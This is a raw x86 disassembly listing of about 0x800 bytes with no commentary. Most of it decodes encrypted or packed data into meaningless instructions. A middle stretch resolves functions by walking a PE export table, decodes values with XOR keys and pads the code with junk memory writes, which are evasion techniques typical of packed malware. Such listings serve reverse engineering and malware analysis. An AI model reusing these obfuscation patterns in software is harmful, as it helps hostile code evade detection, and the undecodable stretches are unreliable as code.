  40cdb8:	xor    DWORD PTR [ebx+0x1afb7ab6],ebx
  40cdbe:	pop    edx
  40cdbf:	pushf  
  40cdc0:	dec    esp
  40cdc1:	retf   0x4de3
  40cdc4:	adc    DWORD PTR [esp+ebp*8-0x92487ca],0x6ef13dc
  40cdcf:	sub    edi,0x51
  40cdd2:	(bad)  
  40cdd3:	xor    ecx,esp
  40cdd5:	test   DWORD PTR [edx+esi*2],esi
  40cdd8:	das    
  40cdd9:	cmp    DWORD PTR [esi+0x6bc9b298],ebx
  40cddf:	mov    esp,0x9b657a79
  40cde4:	pop    esp
  40cde5:	(bad)  
  40cde6:	outs   dx,DWORD PTR ds:[esi]
  40cde7:	(bad)  
  40cde8:	rcr    eax,cl
  40cdea:	test   BYTE PTR [ebx+ebp*1+0x54],cl
  40cdee:	into   
  40cdef:	idiv   al
  40cdf1:	or     BYTE PTR [esp+esi*8],al
  40cdf4:	or     bl,dl
  40cdf6:	sub    DWORD PTR [edi-0x25c946d6],0x5e84cf70
  40ce00:	and    eax,0xcc42b032
  40ce05:	cmp    edi,edx
  40ce07:	mov    cl,0x48
  40ce09:	sbb    al,0x21
  40ce0b:	es hlt 
  40ce0d:	xor    al,0xff
  40ce0f:	push   ecx
  40ce10:	das    
  40ce11:	dec    ebx
  40ce12:	popf   
  40ce13:	and    cl,ah
  40ce15:	inc    ecx
  40ce16:	jecxz  0x40ce91
  40ce18:	push   ebp
  40ce19:	mov    al,ds:0x46d2bd12
  40ce1e:	je     0x40cde8
  40ce20:	jle    0x40ce33
  40ce22:	sbb    BYTE PTR [ecx-0x5db460d8],0xb
  40ce29:	ss ds dec edi
  40ce2c:	add    eax,0x202a909b
  40ce31:	xchg   edi,eax
  40ce32:	add    BYTE PTR [ebx],dl
  40ce34:	out    0xb4,al
  40ce36:	mov    cl,BYTE PTR [ebx-0x78adc52b]
  40ce3c:	push   ss
  40ce3d:	out    dx,eax
  40ce3e:	push   es
  40ce3f:	lock dec ebx
  40ce41:	pop    ecx
  40ce42:	adc    al,0x50
  40ce44:	scas   eax,DWORD PTR es:[edi]
  40ce45:	push   ds
  40ce46:	ja     0x40ce4b
  40ce48:	xor    edi,DWORD PTR [eax]
  40ce4a:	pop    ss
  40ce4b:	mov    edx,0xc490caa9
  40ce50:	and    DWORD PTR [edi+0x39be715c],ebx
  40ce56:	jl     0x40cebc
  40ce58:	jl     0x40cdf1
  40ce5a:	je     0x40ce51
  40ce5c:	div    DWORD PTR [ecx-0x7c95e652]
  40ce62:	inc    esi
  40ce63:	cs push cs
  40ce65:	popf   
  40ce66:	mov    bl,0x9b
  40ce68:	shr    ch,cl
  40ce6a:	xchg   ebp,eax
  40ce6b:	ficomp DWORD PTR [edi+0x757c85ce]
  40ce71:	sti    
  40ce72:	pop    ss
  40ce73:	sahf   
  40ce74:	inc    ebp
  40ce75:	out    dx,eax
  40ce76:	enter  0x7c2c,0xd5
  40ce7a:	out    dx,eax
  40ce7b:	lahf   
  40ce7c:	nop
  40ce7d:	imul   esi,esi,0xff5b1c3b
  40ce83:	lods   al,BYTE PTR ds:[esi]
  40ce84:	push   edx
  40ce85:	push   esp
  40ce86:	xchg   esi,eax
  40ce87:	sti    
  40ce88:	fs ins DWORD PTR es:[edi],dx
  40ce8a:	std    
  40ce8b:	ret    
  40ce8c:	mov    esp,0x9dda1050
  40ce91:	and    DWORD PTR [esi+0x77],esp
  40ce94:	mov    cl,0xb1
  40ce96:	mov    ebx,0x1c8d9dd4
  40ce9b:	sbb    ah,BYTE PTR [esi+edx*8+0x2eff4ee]
  40cea2:	dec    edx
  40cea3:	mov    esp,0x17ebe866
  40cea8:	sbb    al,0x2d
  40ceaa:	cwde   
  40ceab:	xlat   BYTE PTR ds:[ebx]
  40ceac:	sbb    ah,BYTE PTR [esi]
  40ceae:	mov    eax,ds:0x4f56ce83
  40ceb3:	lods   eax,DWORD PTR ds:[esi]
  40ceb4:	pusha  
  40ceb5:	xchg   ah,bh
  40ceb7:	inc    eax
  40ceb8:	adc    al,0x97
  40ceba:	dec    edi
  40cebb:	xchg   ebp,eax
  40cebc:	out    0x2d,eax
  40cebe:	out    0x5c,al
  40cec0:	leave  
  40cec1:	sbb    cl,bh
  40cec3:	loope  0x40cec9
  40cec5:	ss mov dl,0xc0
  40cec8:	frstor [eax]
  40ceca:	and    edi,DWORD PTR ds:0xb9fc8810
  40ced0:	int    0x4
  40ced2:	sbb    BYTE PTR [ebx-0x80],al
  40ced5:	inc    ebx
  40ced6:	ds mov dl,0xce
  40ced9:	jp     0x40cf4d
  40cedb:	jbe    0x40cf0e
  40cedd:	pop    esi
  40cede:	jo     0x40cef9
  40cee0:	std    
  40cee1:	aaa    
  40cee2:	push   0x64
  40cee4:	call   0x588e:0x35f5f817
  40ceeb:	pop    edx
  40ceec:	add    BYTE PTR [ecx+0x14c8df44],ch
  40cef2:	add    eax,0xa46c8953
  40cef7:	or     bh,cl
  40cef9:	(bad)  
  40cefa:	enter  0x8bf1,0xcb
  40cefe:	cli    
  40ceff:	out    dx,eax
  40cf00:	push   edi
  40cf01:	lock push ecx
  40cf03:	pop    esp
  40cf04:	mov    cs,WORD PTR [ebx]
  40cf06:	les    ecx,FWORD PTR [eax+0x5d]
  40cf09:	mov    ds:0x81ec6a88,eax
  40cf0e:	in     al,dx
  40cf0f:	call   0xbdbc:0xd6313e13
  40cf16:	inc    eax
  40cf17:	cmp    eax,0xdada363c
  40cf1c:	hlt    
  40cf1d:	fsubrp st(0),st
  40cf1f:	test   BYTE PTR es:[ebx],bh
  40cf22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf23:	sbb    ah,BYTE PTR [edx-0x157a9d95]
  40cf29:	cmc    
  40cf2a:	mov    dl,0xe0
  40cf2c:	test   eax,0x6eba6990
  40cf31:	ds dec ebx
  40cf33:	out    0xfe,al
  40cf35:	adc    DWORD PTR [ebp+ecx*8+0x50ef7c0f],ebx
  40cf3c:	int3   
  40cf3d:	or     esp,DWORD PTR [ecx+0xb]
  40cf40:	push   cs
  40cf41:	dec    ebp
  40cf42:	lds    ecx,FWORD PTR [ebx-0x7ed170f3]
  40cf48:	inc    edx
  40cf49:	dec    eax
  40cf4a:	mov    ?,WORD PTR [ebx+0x34]
  40cf4d:	ss dec esp
  40cf4f:	dec    ebx
  40cf50:	cdq    
  40cf51:	test   al,bl
  40cf53:	ja     0x40cf97
  40cf55:	out    0x2,eax
  40cf57:	xchg   ebx,eax
  40cf58:	fadd   QWORD PTR [eax-0x5b]
  40cf5b:	lea    esp,[edi]
  40cf5d:	hlt    
  40cf5e:	test   BYTE PTR [ecx-0x4dc7463f],bl
  40cf64:	fwait
  40cf65:	cmc    
  40cf66:	rcl    BYTE PTR [esi-0x1ab49a91],0x9e
  40cf6d:	(bad)  
  40cf6e:	jge    0x40cfc6
  40cf70:	jo     0x40cf1e
  40cf72:	xchg   ecx,eax
  40cf73:	adc    ebp,ecx
  40cf75:	adc    esp,DWORD PTR ds:[ebx-0x1f]
  40cf79:	pop    ds
  40cf7a:	mov    dh,0x6b
  40cf7c:	ror    DWORD PTR [eax+0x4a50bf21],cl
  40cf82:	test   eax,0xd941cd5f
  40cf87:	int3   
  40cf88:	mov    ebx,0xb6aff94e
  40cf8d:	out    dx,al
  40cf8e:	adc    al,0x1f
  40cf90:	ret    
  40cf91:	mov    BYTE PTR [esi-0x5886c772],ch
  40cf97:	push   cs
  40cf98:	loop   0x40cfde
  40cf9a:	pop    es
  40cf9b:	loopne 0x40cf76
  40cf9d:	enter  0x1191,0xf8
  40cfa1:	jno    0x40cfc3
  40cfa3:	or     dh,BYTE PTR [esp+edi*2]
  40cfa6:	inc    eax
  40cfa7:	add    ch,BYTE PTR [ecx-0x54f3de99]
  40cfad:	push   es
  40cfae:	inc    esi
  40cfaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfb0:	frstor [edx]
  40cfb2:	jmp    0xc6391a22
  40cfb7:	xchg   ebx,eax
  40cfb8:	dec    eax
  40cfb9:	cmp    eax,0x2438b16
  40cfbe:	es icebp 
  40cfc0:	scas   al,BYTE PTR es:[edi]
  40cfc1:	aam    0x93
  40cfc3:	inc    eax
  40cfc4:	(bad)  
  40cfc6:	pop    ss
  40cfc7:	dec    esp
  40cfc8:	push   eax
  40cfc9:	ror    BYTE PTR [esi+0x3ada166b],cl
  40cfcf:	xchg   esi,eax
  40cfd0:	repnz inc ebx
  40cfd2:	lock adc eax,0xa11cf746
  40cfd8:	and    BYTE PTR [esi+0x76],ah
  40cfdb:	or     eax,0xfb9048f
  40cfe0:	fldenv [edi]
  40cfe2:	nop
  40cfe3:	add    bh,BYTE PTR [eax]
  40cfe5:	(bad)  [ecx]
  40cfe7:	ret    0x4634
  40cfea:	or     cl,BYTE PTR [ebp-0x15]
  40cfed:	add    al,0x4b
  40cfef:	jmp    0x40cfee
  40cff1:	add    BYTE PTR [ebp+0x6b],ah
  40cff4:	cmp    BYTE PTR [ecx],cl
  40cff6:	jno    0x40cfeb
  40cff8:	mov    ch,0xb7
  40cffa:	in     al,dx
  40cffb:	xchg   ebp,eax
  40cffc:	jo     0x40d06b
  40cffe:	xlat   BYTE PTR ds:[ebx]
  40cfff:	sbb    DWORD PTR [eax+0xd],edx
  40d002:	lods   eax,DWORD PTR ds:[esi]
  40d003:	in     eax,dx
  40d004:	push   cs
  40d005:	jmp    0x977fbdeb
  40d00a:	call   0xe713:0x1f2919e4
  40d011:	xor    dh,BYTE PTR [esi]
  40d013:	xor    eax,0xcd9b8fe9
  40d018:	setae  BYTE PTR [esi]
  40d01b:	mov    bh,0xcc
  40d01d:	jae    0x40d016
  40d01f:	jmp    0xe1ea2b6b
  40d024:	push   ebx
  40d025:	jmp    0x40cfb4
  40d027:	xor    DWORD PTR [ecx+0x65226882],ebx
  40d02d:	pop    esi
  40d02e:	loope  0x40cfba
  40d030:	mov    bh,0x78
  40d032:	dec    ebp
  40d033:	adc    BYTE PTR [esi+0x6a],bl
  40d036:	jecxz  0x40d00a
  40d038:	jle    0x40d067
  40d03a:	out    0xf5,al
  40d03c:	cdq    
  40d03d:	ret    0x7627
  40d040:	shr    dh,1
  40d042:	push   edx
  40d043:	aad    0x4b
  40d045:	mov    edi,0x6363fd3b
  40d04a:	sub    BYTE PTR [ecx],dh
  40d04c:	xchg   esi,eax
  40d04d:	mov    ecx,0x7c60cca7
  40d052:	cli    
  40d053:	sbb    eax,0xc2a03884
  40d058:	pop    ecx
  40d059:	fcomp  QWORD PTR [esi+0x370a5fb]
  40d05f:	sub    DWORD PTR [ecx],ebx
  40d061:	js     0x40d09b
  40d063:	mov    ecx,DWORD PTR [ebp+0x8]
  40d066:	sbb    DWORD PTR ds:0x42a2b6,0x42a2d2
  40d070:	add    ecx,DWORD PTR [eax+0x24]
  40d073:	and    DWORD PTR ds:0x42a2de,0x1336
  40d07d:	mov    DWORD PTR [ebp-0x34],ecx
  40d080:	mov    eax,DWORD PTR [ebp-0x14]
  40d083:	mov    ecx,DWORD PTR [ebp+0x8]
  40d086:	add    DWORD PTR ds:0x42a276,0x42a2a6
  40d090:	add    ecx,DWORD PTR [eax+0x1c]
  40d093:	mov    DWORD PTR ds:0x42a2ae,0x5cb0
  40d09d:	mov    DWORD PTR [ebp-0x14],ecx
  40d0a0:	mov    DWORD PTR ds:0x42a2f2,0x755c
  40d0aa:	jmp    0x40d194
  40d0af:	or     eax,ecx
  40d0b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40d0b4:	xor    ecx,0x90a
  40d0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40d0bd:	adc    DWORD PTR ds:0x42a28e,0x25cc
  40d0c7:	add    ecx,DWORD PTR [eax+ebx*4]
  40d0ca:	mov    DWORD PTR [ebp-0x28],ecx
  40d0cd:	xor    eax,0x75c
  40d0d2:	mov    eax,DWORD PTR [ebp-0x4]
  40d0d5:	mov    ecx,DWORD PTR [ebp-0x28]
  40d0d8:	xor    eax,esi
  40d0da:	and    DWORD PTR ds:0x42a2ae,0x42a2c2
  40d0e4:	add    eax,edi
  40d0e6:	mov    DWORD PTR ds:0x42a2ea,0x1030
  40d0f0:	cmp    ecx,eax
  40d0f2:	mov    DWORD PTR ds:0x42a2c6,0xfb7
  40d0fc:	je     0x40d194
  40d102:	mov    DWORD PTR ds:0x42a262,0xed5
  40d10c:	jmp    0x40d185
  40d111:	and    DWORD PTR ds:0x42a2e2,0x0
  40d11b:	jmp    0x40d12d
  40d120:	mov    ecx,DWORD PTR ds:0x42a2e2
  40d126:	inc    ecx
  40d127:	mov    DWORD PTR ds:0x42a2e2,ecx
  40d12d:	cmp    DWORD PTR ds:0x42a2e2,0x10
  40d134:	jae    0x40d161
  40d13a:	cmp    DWORD PTR ds:0x42a2e2,0x15
  40d141:	jle    0x40d161
  40d147:	jmp    0x40d15c
  40d14c:	push   0x42a2ae
  40d151:	push   0x429181
  40d156:	call   DWORD PTR ds:0x42a3ca
  40d15c:	jmp    0x40d120
  40d161:	mov    eax,DWORD PTR [ebp-0x4]
  40d164:	mov    ecx,DWORD PTR [ebp-0x8]
  40d167:	xor    eax,esi
  40d169:	add    eax,edi
  40d16b:	cmp    ecx,eax
  40d16d:	mov    eax,DWORD PTR [ebp-0x4]
  40d170:	je     0x40d1cf
  40d176:	mov    ecx,DWORD PTR [ebp-0x30]
  40d179:	xor    eax,esi
  40d17b:	add    eax,edi
  40d17d:	cmp    ecx,eax
  40d17f:	je     0x40d1d8
  40d185:	lea    eax,[ebp-0x8]
  40d188:	push   eax
  40d189:	push   DWORD PTR [ebp-0x28]
  40d18c:	push   DWORD PTR [ebp+0xc]
  40d18f:	call   0x41622a
  40d194:	mov    eax,DWORD PTR [ebp-0x4]
  40d197:	mov    ecx,DWORD PTR [ebp-0x8]
  40d19a:	xor    eax,esi
  40d19c:	add    eax,edi
  40d19e:	cmp    ecx,eax
  40d1a0:	je     0x40d1bb
  40d1a6:	mov    eax,DWORD PTR [ebp-0x34]
  40d1a9:	movzx  eax,WORD PTR [eax+ebx*2]
  40d1ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40d1b0:	mov    eax,DWORD PTR [ecx+eax*4]
  40d1b3:	mov    DWORD PTR [ebp-0x38],eax
  40d1b6:	jmp    0x40d111
  40d1bb:	mov    eax,DWORD PTR [ebp-0xc]
  40d1be:	xor    eax,esi
  40d1c0:	lea    ebx,[ebx+eax*1+0x3272f1]
  40d1c7:	jmp    0x40872d
  40d1cc:	mov    eax,DWORD PTR [ebp-0x4]
  40d1cf:	xor    eax,esi
  40d1d1:	add    eax,edi
  40d1d3:	jmp    0x413da1
  40d1d8:	mov    eax,DWORD PTR [ebp-0x38]
  40d1db:	add    eax,DWORD PTR [ebp+0x8]
  40d1de:	mov    DWORD PTR [ebp-0x18],eax
  40d1e1:	mov    eax,DWORD PTR [ebp-0x1c]
  40d1e4:	test   eax,eax
  40d1e6:	je     0x40f60e
  40d1ec:	mov    DWORD PTR [ebp-0x20],0x0
  40d1f3:	push   0x3
  40d1f5:	xor    edx,edx
  40d1f7:	pop    edx
  40d1f8:	add    edx,0x8
  40d1fb:	push   edx
  40d1fc:	pop    ecx
  40d1fd:	push   0x6
  40d1ff:	dec    ecx
  40d200:	pop    ebx
  40d201:	dec    ebx
  40d202:	xchg   ebx,ecx
  40d204:	sub    ebx,ecx
  40d206:	xchg   ebx,ecx
  40d208:	dec    ecx
  40d209:	mov    eax,DWORD PTR [ebp-0x1c]
  40d20c:	imul   eax,ecx
  40d20f:	sub    esp,eax
  40d211:	mov    DWORD PTR [ebp-0x20],esp
  40d214:	mov    eax,DWORD PTR [ebp-0x4]
  40d217:	xor    eax,esi
  40d219:	add    eax,edi
  40d21b:	jmp    0x40f5e7
  40d220:	mov    ecx,DWORD PTR [ebp-0xc]
  40d223:	mov    eax,DWORD PTR [ebp+0x8]
  40d226:	mov    edx,DWORD PTR [ebp+0x14]
  40d229:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d22d:	xor    ecx,esi
  40d22f:	add    ecx,edi
  40d231:	xor    edx,edx
  40d233:	div    ecx
  40d235:	mov    ecx,DWORD PTR [ebp-0x4]
  40d238:	jmp    0x40f5c6
  40d23d:	adc    esp,DWORD PTR [eax-0x55]
  40d240:	jl     0x40d1c2
  40d242:	mov    eax,0x95ec0084
  40d247:	bound  ebp,QWORD PTR [ecx-0x5d]
  40d24a:	push   ds
  40d24b:	clc    
  40d24c:	dec    eax
  40d24d:	jmp    0xcc45625
  40d252:	pop    esi
  40d253:	add    DWORD PTR [ebx+0x1d4eac8c],0x38
  40d25a:	retf   
  40d25b:	std    
  40d25c:	inc    esi
  40d25d:	mov    bl,0xde
  40d25f:	ss pop es
  40d261:	mov    al,0xcd
  40d263:	mov    bh,0xb7
  40d265:	lds    bp,DWORD PTR [esi+0x68]
  40d269:	in     eax,dx
  40d26a:	inc    edi
  40d26b:	nop
  40d26c:	sbb    al,0x40
  40d26e:	jnp    0x40d2cf
  40d270:	iret   
  40d271:	push   ds
  40d272:	or     eax,0x5547ce30
  40d277:	int    0x8f
  40d279:	xor    dh,BYTE PTR [eax+ecx*1+0x3db81b0]
  40d280:	outs   dx,BYTE PTR ds:[esi]
  40d281:	bound  ebp,QWORD PTR ds:0x16de8c87
  40d287:	retf   0xda7a
  40d28a:	dec    esp
  40d28b:	add    DWORD PTR [esi+ebx*1],eax
  40d28e:	(bad)  
  40d28f:	push   edi
  40d290:	imul   edi,DWORD PTR gs:[edx+0x67],0xffffffc0
  40d295:	mov    DWORD PTR [edi+eax*4+0x49d6426f],edx
  40d29c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d29d:	imul   edi,DWORD PTR [edi+0x5558d6b6],0xffffff9e
  40d2a4:	loop   0x40d296
  40d2a6:	stos   DWORD PTR es:[edi],eax
  40d2a7:	aaa    
  40d2a8:	cs pop edx
  40d2aa:	rol    BYTE PTR [ecx-0x32de6420],cl
  40d2b0:	or     eax,ebx
  40d2b2:	xchg   edx,eax
  40d2b3:	lods   eax,DWORD PTR ds:[esi]
  40d2b4:	mov    ecx,0x737bc807
  40d2b9:	retf   
  40d2ba:	push   ss
  40d2bb:	xlat   BYTE PTR ds:[ebx]
  40d2bc:	mov    bl,0x45
  40d2be:	sar    BYTE PTR [edx+0x68a489f],cl
  40d2c4:	ja     0x40d2f6
  40d2c6:	push   ss
  40d2c7:	sar    BYTE PTR [edx-0x15],cl
  40d2ca:	cmp    BYTE PTR [esi-0xe],bl
  40d2cd:	fdiv   QWORD PTR [ebx+0x43]
  40d2d0:	popf   
  40d2d1:	out    dx,al
  40d2d2:	adc    dh,cl
  40d2d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2d5:	in     eax,0xd2
  40d2d7:	and    DWORD PTR [esi-0x30],0xffffffed
  40d2db:	mov    ebx,DWORD PTR [ebx]
  40d2dd:	mov    al,ds:0xf1f8ed4e
  40d2e2:	cdq    
  40d2e3:	outs   dx,BYTE PTR ds:[esi]
  40d2e4:	dec    esp
  40d2e5:	inc    ebx
  40d2e6:	mov    edi,0xccddaa77
  40d2eb:	inc    esi
  40d2ec:	adc    bl,dh
  40d2ee:	dec    esi
  40d2ef:	mov    ebx,0xad5b7e60
  40d2f4:	jle    0x40d2f7
  40d2f6:	mul    DWORD PTR [esi-0x2575e64f]
  40d2fc:	std    
  40d2fd:	mov    al,0x22
  40d2ff:	shl    ebx,1
  40d301:	popf   
  40d302:	fdiv   QWORD PTR [edi]
  40d304:	jb     0x40d342
  40d306:	in     al,dx
  40d307:	push   cs
  40d308:	xchg   ebp,eax
  40d309:	clc    
  40d30a:	ret    0x10ee
  40d30d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d30e:	push   edx
  40d30f:	imul   esp,DWORD PTR [esi-0x36],0x50
  40d313:	mov    edi,0x17053a7a
  40d318:	and    dh,ah
  40d31a:	sub    cl,BYTE PTR ds:0xb7ad7f57
  40d320:	push   cs
  40d321:	inc    DWORD PTR [edx+0x4f]
  40d324:	cmp    ebx,DWORD PTR [ecx+0x5b]
  40d327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d328:	int    0x3e
  40d32a:	int3   
  40d32b:	cli    
  40d32c:	jp     0x40d364
  40d32e:	xor    ch,bl
  40d330:	ins    DWORD PTR es:[edi],dx
  40d331:	call   0xa86e5ee8
  40d336:	(bad)  
  40d337:	jnp    0x40d2e5
  40d339:	xor    eax,0x49676bf4
  40d33e:	mov    DWORD PTR [ecx+esi*4-0x5c],ebp
  40d342:	fwait
  40d343:	test   al,0xec
  40d345:	sti    
  40d346:	jmp    0x40d348
  40d348:	(bad)  
  40d349:	ins    DWORD PTR es:[edi],dx
  40d34a:	dec    edi
  40d34b:	retf   
  40d34c:	add    al,0xa2
  40d34e:	pop    ss
  40d34f:	repnz (bad) 
  40d351:	(bad)  
  40d352:	in     eax,0xcf
  40d354:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d357:	jbe    0x40d3be
  40d359:	mov    tr4,ebx
  40d35c:	(bad)
  40d35f:	mov    eax,ds:0x3963f63a
  40d364:	adc    DWORD PTR [esi+ecx*1],0xffffff85
  40d368:	icebp  
  40d369:	or     dh,BYTE PTR [ebp-0x23228210]
  40d36f:	retf   0x4bf9
  40d372:	bound  edi,QWORD PTR [ecx]
  40d374:	adc    cl,0x9c
  40d377:	loop   0x40d36c
  40d379:	sub    eax,0x7ad7a762
  40d37e:	sub    BYTE PTR [edx],bl
  40d380:	mov    ch,0xbf
  40d382:	xor    eax,0x5a4565a
  40d387:	xor    eax,0xd00af648
  40d38c:	adc    BYTE PTR [eax+0x53],ch
  40d38f:	push   ebp
  40d390:	xor    eax,0xe6bfa17d
  40d395:	add    eax,0x902399a0
  40d39a:	arpl   si,cx
  40d39c:	mov    ss,WORD PTR [eax*1+0x229d8cff]
  40d3a3:	or     esi,DWORD PTR [ebx-0x23]
  40d3a6:	ins    DWORD PTR es:[edi],dx
  40d3a7:	pop    edi
  40d3a8:	jno    0x40d364
  40d3aa:	addr16 (bad) 
  40d3ac:	sbb    cl,ch
  40d3ae:	adc    eax,0x2e7253b8
  40d3b3:	or     DWORD PTR [eax-0x4b],eax
  40d3b6:	xchg   esi,eax
  40d3b7:	pop    ebp
  40d3b8:	xchg   esi,eax
  40d3b9:	or     eax,0x328031ac
  40d3be:	sub    eax,0x1d14090
  40d3c3:	inc    BYTE PTR [esi-0x49]
  40d3c6:	and    ah,0x68
  40d3c9:	xchg   ecx,eax
  40d3ca:	and    BYTE PTR [ecx+0x5c555cef],ch
  40d3d0:	cmp    eax,0xf8e7e551
  40d3d5:	pop    es
  40d3d6:	xor    eax,0xc66fca5c
  40d3db:	push   es
  40d3dc:	loopne 0x40d42b
  40d3de:	mov    ebx,0xe40e9266
  40d3e3:	jl     0x40d421
  40d3e5:	dec    edi
  40d3e6:	fldcw  WORD PTR [esi+0x2918cf9c]
  40d3ec:	int    0x38
  40d3ee:	neg    DWORD PTR [esi]
  40d3f0:	aam    0x7f
  40d3f2:	ds iret 
  40d3f4:	stos   DWORD PTR es:[edi],eax
  40d3f5:	pop    esi
  40d3f6:	pop    esp
  40d3f7:	push   es
  40d3f8:	mov    dh,0x23
  40d3fa:	or     al,0x98
  40d3fc:	clc    
  40d3fd:	push   edi
  40d3fe:	inc    ecx
  40d3ff:	sbb    BYTE PTR [esi+0x27],al
  40d402:	jo     0x40d3c7
  40d404:	dec    ebp
  40d405:	or     eax,0x4ef0db09
  40d40a:	ret    
  40d40b:	xor    DWORD PTR [ebp-0x60596f76],eax
  40d411:	out    0x87,eax
  40d413:	das    
  40d414:	icebp  
  40d415:	or     dh,BYTE PTR [ebp-0x7f]
  40d418:	(bad)  
  40d419:	call   0x5986:0x5def1025
  40d420:	pop    ebx
  40d421:	fnstcw WORD PTR [ebx-0x23]
  40d424:	arpl   WORD PTR [eax-0x76],bp
  40d427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d428:	enter  0xeaa8,0xbd
  40d42c:	add    edx,DWORD PTR [eax-0x4f]
  40d42f:	push   0x83223ffb
  40d434:	scas   eax,DWORD PTR es:[di]
  40d436:	popf   
  40d437:	dec    edi
  40d438:	sbb    DWORD PTR [ebp+0x774419f],ecx
  40d43e:	scas   al,BYTE PTR es:[edi]
  40d43f:	and    ah,BYTE PTR [edi-0x2f5cbc7f]
  40d445:	xor    eax,0xce05cb1c
  40d44a:	jmp    0x11453f09
  40d44f:	cmc    
  40d450:	mov    al,0xa2
  40d452:	xor    DWORD PTR ds:0x4a55c601,ecx
  40d458:	scas   al,BYTE PTR es:[edi]
  40d459:	sub    BYTE PTR [edi+0x47246716],0x20
  40d460:	and    eax,0x1b0cf801
  40d465:	bound  ebx,QWORD PTR [ecx]
  40d467:	jno    0x40d457
  40d469:	push   ss
  40d46a:	out    dx,eax
  40d46b:	mov    esp,0x57cea01
  40d470:	push   esi
  40d471:	mov    ah,0x45
  40d473:	sbb    al,0xbb
  40d475:	rol    BYTE PTR ds:0xb88b5d4e,0x21
  40d47c:	jnp    0x40d4ae
  40d47e:	in     al,dx
  40d47f:	repz int3 
  40d481:	or     eax,0x59556914
  40d486:	out    0x2f,eax
  40d488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d489:	aas    
  40d48a:	push   es
  40d48b:	cmp    eax,0x97cdb8f0
  40d490:	xor    dh,dl
  40d492:	xor    DWORD PTR [eax],esi
  40d494:	push   ds
  40d495:	adc    eax,0xf1943f70
  40d49a:	mov    ds:0x7f07cd8c,al
  40d49f:	mov    ecx,0xacd0d152
  40d4a4:	clc    
  40d4a5:	(bad)  
  40d4a6:	mov    ebx,0xf4194c1a
  40d4ab:	aam    0x2d
  40d4ad:	cmp    ebp,edx
  40d4af:	mov    cl,0x42
  40d4b1:	cwde   
  40d4b2:	add    al,0x68
  40d4b4:	mov    WORD PTR [eax],?
  40d4b6:	mov    bp,0xa56a
  40d4ba:	push   ebp
  40d4bb:	xchg   esi,eax
  40d4bc:	sbb    DWORD PTR [edi+0xfe76f4c],esp
  40d4c2:	dec    ebx
  40d4c3:	jbe    0x40d52a
  40d4c5:	pusha  
  40d4c6:	and    eax,0x9dcc7f7d
  40d4cb:	stos   BYTE PTR es:[edi],al
  40d4cc:	adc    ebx,eax
  40d4ce:	dec    esi
  40d4cf:	jns    0x40d4e3
  40d4d1:	adc    ecx,DWORD PTR [ebp-0x5a563c91]
  40d4d7:	adc    dl,al
  40d4d9:	and    al,0x3c
  40d4db:	ror    DWORD PTR [ebp+0x75],cl
  40d4de:	aad    0x63
  40d4e0:	sub    BYTE PTR [eax+0x22],dh
  40d4e3:	enter  0xe3a8,0x99
  40d4e7:	pop    ss
  40d4e8:	popa   
  40d4e9:	or     eax,0x90b245e7
  40d4ee:	repnz inc esp
  40d4f0:	or     DWORD PTR [eax-0x463bd0c9],eax
  40d4f6:	xchg   esp,eax
  40d4f7:	inc    ebx
  40d4f8:	cmp    bl,BYTE PTR [ecx]
  40d4fa:	dec    esp
  40d4fb:	dec    ebp
  40d4fc:	jno    0x40d48b
  40d4fe:	div    DWORD PTR [edi-0x6a]
  40d501:	call   0xba4b:0x70972ef3
  40d508:	inc    ecx
  40d509:	push   eax
  40d50a:	xor    edx,ebp
  40d50c:	cmp    eax,0x18da520f
  40d511:	dec    ebp
  40d512:	repnz cmp dl,dh
  40d515:	lock adc DWORD PTR [ebp+0x57],edx
  40d519:	sbb    DWORD PTR [edi],esp
  40d51b:	out    dx,al
  40d51c:	dec    edx
  40d51d:	bound  ebx,QWORD PTR [ecx]
  40d51f:	jne    0x40d4e3
  40d521:	inc    edi
  40d522:	not    dl
  40d524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d525:	shl    DWORD PTR ds:0x3e52f735,0x7f
  40d52c:	les    eax,FWORD PTR cs:[eax]
  40d52f:	fs std 
  40d531:	rol    DWORD PTR ds:0xb4f9029f,1
  40d537:	jge    0x40d4c2
  40d539:	jmp    0xa084:0x69ec6532
  40d540:	xor    ecx,DWORD PTR [esi]
  40d542:	inc    esi
  40d543:	push   edx
  40d544:	mov    ds:0x9175a20a,al
  40d549:	mov    al,0x7f
  40d54b:	dec    eax
  40d54c:	push   0x46bfda3c
  40d551:	pop    esp
  40d552:	leave  
  40d553:	imul   ecx,DWORD PTR [ecx+eiz*4],0x352aa31
  40d55a:	gs jno 0x40d4f9
  40d55d:	addr16 sbb al,0x65
  40d560:	add    al,0x63
  40d562:	inc    ecx
  40d563:	sub    ebp,DWORD PTR [ebx+0x2d]
  40d566:	lds    edx,FWORD PTR ss:[ebp+eax*8-0x47]
  40d56b:	inc    ebx
  40d56c:	fwait
  40d56d:	data16 cmc 
  40d56f:	xchg   edx,eax
  40d570:	popa   
  40d571:	cli    
  40d572:	and    ecx,DWORD PTR [eax-0xd]
  40d575:	pop    ds
  40d576:	sbb    ebp,DWORD PTR [ebx+0x7e]
  40d579:	out    0xd1,eax
  40d57b:	push   0xffffffcb
  40d57d:	scas   eax,DWORD PTR es:[edi]
  40d57e:	test   eax,0x73d13efb
  40d583:	cwde   
  40d584:	je     0x40d5a7
  40d586:	jg     0x40d548
  40d588:	and    cl,BYTE PTR [edx]
  40d58a:	and    al,0x1c
  40d58c:	mov    al,ds:0x291ad56e
  40d591:	loopne 0x40d5ff
  40d593:	or     dh,BYTE PTR [eax]
  40d595:	or     eax,eax
  40d597:	cdq    
  40d598:	scas   eax,DWORD PTR es:[edi]
  40d599:	rcl    BYTE PTR [ebp-0xd],0xb6
  40d59d:	add    ah,BYTE PTR [edx]
  40d59f:	jo     0x40d5ad
